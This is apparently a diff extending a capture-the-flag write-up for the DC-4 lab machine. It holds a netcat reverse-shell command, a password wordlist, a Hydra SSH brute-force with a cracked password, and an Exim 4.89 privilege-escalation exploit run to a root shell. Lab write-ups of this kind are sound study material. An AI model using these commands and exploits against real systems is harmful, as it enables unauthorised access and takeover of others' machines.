@@ -270,4 +270,467 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
  ```
 
-To be continue ..
+To be continue .
+
+## Shell return 
+
+use the command.php with 
+
+nc -e /bin/sh <ip> port 
+
+and search the files  other people 
+```
+000000
+12345
+iloveyou
+1q2w3e4r5t
+1234
+123456a
+qwertyuiop
+monkey
+123321
+dragon
+654321
+666666
+123
+myspace1
+a123456
+121212
+1qaz2wsx
+123qwe
+123abc
+tinkle
+target123
+gwerty
+1g2w3e4r
+gwerty123
+zag12wsx
+7777777
+qwerty1
+1q2w3e4r
+987654321
+222222
+qwe123
+qwerty123
+zxcvbnm
+555555
+112233
+fuckyou
+asdfghjkl
+12345a
+123123123
+1q2w3e
+qazwsx
+loveme1
+juventus
+jennifer1
+!~!1
+bubbles
+samuel
+fuckoff
+lovers
+cheese1
+0123456
+123asd
+999999999
+madison
+elizabeth1
+music
+buster1
+lauren
+david1
+tigger1
+123qweasd
+taylor1
+carlos
+tinkerbell
+samantha1
+Sojdlg123aljg
+joshua1
+poop
+stella
+myspace123
+asdasd5
+freedom1
+whatever1
+xxxxxx
+00000
+valentina
+a1b2c3
+741852963
+austin
+monica
+qaz123
+lovely1
+music1
+harley1
+family1
+spongebob1
+steven
+nirvana
+1234abcd
+hellokitty
+thomas1
+cooper
+520520
+muffin
+christian1
+love13
+fucku2
+arsenal1
+lucky7
+diablo
+apples
+george1
+babyboy1
+crystal
+1122334455
+player1
+aa123456
+vfhbyf
+forever1
+Password
+winston
+chivas1
+sexy
+hockey1
+1a2b3c4d
+pussy
+playboy1
+stalker
+cherry
+tweety
+toyota
+creative
+gemini
+pretty1
+maverick
+brittany1
+nathan1
+letmein1
+cameron1
+secret1
+google1
+heaven
+martina
+murphy
+spongebob
+uQA9Ebw445
+fernando
+pretty
+startfinding
+softball
+dolphin1
+fuckme
+test123
+qwerty1234
+kobe24
+alejandro
+adrian
+september
+aaaaaa1
+bubba1
+isabella
+abc123456
+password3
+jason1
+abcdefg123
+loveyou1
+shannon
+100200
+manuel
+leonardo
+molly1
+flowers
+123456z
+007007
+password.
+321321
+miguel
+samsung1
+sergey
+sweet1
+abc1234
+windows
+qwert123
+vfrcbv
+poohbear
+d123456
+school1
+badboy
+951753
+123456c
+111
+steven1
+snoopy1
+garfield
+YAgjecc826
+compaq
+candy1
+sarah1
+qwerty123456
+123456l
+eminem1
+141414
+789789
+maria
+steelers
+iloveme1
+morgan1
+winner
+boomer
+lolita
+nastya
+alexis1
+carmen
+angelo
+nicholas1
+portugal
+precious
+jackass1
+jonathan1
+yfnfif
+bitch
+tiffany
+rabbit
+rainbow1
+angel123
+popcorn
+barbara
+brandy
+starwars1
+barney
+natalia
+jibril04
+hiphop
+tiffany1
+shorty
+poohbear1
+simone
+albert
+marlboro
+hardcore
+cowboys
+sydney
+alex
+scorpio
+1234512345
+q12345
+qq123456
+onelove
+bond007
+abcdefg1
+eagles
+crystal1
+azertyuiop
+winter
+sexy12
+angelina
+james
+svetlana
+fatima
+123456k
+icecream
+popcorn1
+
+```
+
+
+and also we get this 
+
+```
+ls -al && pwd
+total 32
+drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
+drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
+-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
+-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
+-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
+drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
+-rw------- 1 jim  jim   528 Apr  6  2019 mbox
+-rwsrwxrwx 1 jim  jim    39 Jan 25 14:20 test.sh
+/home/jim
+
+```
+we can use the suid  to get root .
+
+ok now we just need login as the jim 
+
+and edit the sh file to go root and got my flag 
+
+nice!!!
+
+## horizontal crossing the account(su the user) 
+
+
+so we can do hydra and crack password in backupfiles
+``` bash 
+─$ hydra -l jim -P ./passwords.txt ssh://192.168.31.241                                   130 ⨯
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * * * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-24 23:32:09
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task
+[DATA] attacking ssh://192.168.31.241:22/
+[STATUS] 177.00 tries/min, 177 tries in 00:01h, 77 to do in 00:01h, 16 active
+[22][ssh] host: 192.168.31.241   login: jim   password: jibril04
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-24 23:33:43
+```
+
+
+```
+└─$ ssh jim@192.168.31.119
+The authenticity of host '192.168.31.119 (192.168.31.119)' can't be established.
+ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.31.119' (ECDSA) to the list of known hosts.
+jim@192.168.31.119's password: 
+Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
+jim@dc-4:~$ ls
+backups  mbox  test.sh
+jim@dc-4:~$ ls -al
+total 32
+drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
+drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
+drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
+-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
+-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
+-rw------- 1 jim  jim   528 Apr  6  2019 mbox
+-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
+-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh
+jim@dc-4:~$ 
+
+
+```
+
+edit the shell file !!
+
+# ROOT(pwn this machine)
+
+there has  a question how to edit the file with suid without the suid lose
+
+but fail?
+i cam't root by this.
+
+cat the mbox we can see the mail says
+
+```
+From root@dc-4 Sat Apr 06 20:20:04 2019
+Return-path: <root@dc-4>
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
+Received: from root by dc-4 with local (Exim 4.89)
+        (envelope-from <root@dc-4>)
+        id 1hCiQe-0000gc-EC
+        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
+To: jim@dc-4
+Subject: Test
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1hCiQe-0000gc-EC@dc-4>
+From: root <root@dc-4>
+Date: Sat, 06 Apr 2019 20:20:04 +1000
+Status: RO
+
+This is a test.
+
+```
+
+emm my be the suid shell script is the rabbit hole for the SUID ?
+
+emmmmmmmmmmmmm....
+
+seen this mail i got my idea about how to exp it.
+
+and i remember the exim 4 maybe got the dirty Linux LPE vuln
+
+run find command 
+
+```
+jim@dc-4:~$ find / -type f -perm -u=s 2>/dev/zero
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/exim4
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping
+/home/jim/test.sh
+
+```
+yes the exim4
+
+
+cp the payload 46996 on exploit-db.com  to the machine
+
+```
+jim@dc-4:~$ ./exp.sh -m netcat
+
+raptor_exim_wiz - "The Return of the WIZard" LPE exploit
+Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+Delivering netcat payload...
+220 dc-4 ESMTP Exim 4.89 Mon, 25 Jan 2021 16:34:02 +1000
+250 dc-4 Hello localhost [::1]
+250 OK
+250 Accepted
+354 Enter message, ending with "." on a line by itself
+250 OK id=1l3vRq-0000HP-OZ
+221 dc-4 closing connection
+
+Waiting 5 seconds...
+localhost [127.0.0.1] 31337 (?) open
+ls
+db
+gnutls-params-2048
+input
+msglog
+whoami
+root
+cd /root
+ls
+flag.txt
+cat flag.txt
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  "Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+
+```
+
+SUCCESS!!!!!
